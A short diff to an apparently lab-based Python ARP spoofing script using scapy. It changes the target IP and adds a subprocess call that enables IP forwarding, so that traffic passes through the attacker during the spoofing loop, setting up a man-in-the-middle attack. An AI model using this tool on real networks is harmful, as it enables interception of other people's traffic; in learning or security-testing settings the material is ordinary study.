@@ -3,8 +3,9 @@
 import scapy.all as scapy
 import time
 import sys
+import subprocess
 
-target_ip="10.0.2.15"
+target_ip="10.0.2.6"
 gateway_ip = "10.0.2.1"
 
 def get_arguments():
@@ -42,6 +43,7 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 try:
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward ")
     sent_packets_counts = 0
     while True:
         spoof(target_ip, gateway_ip)
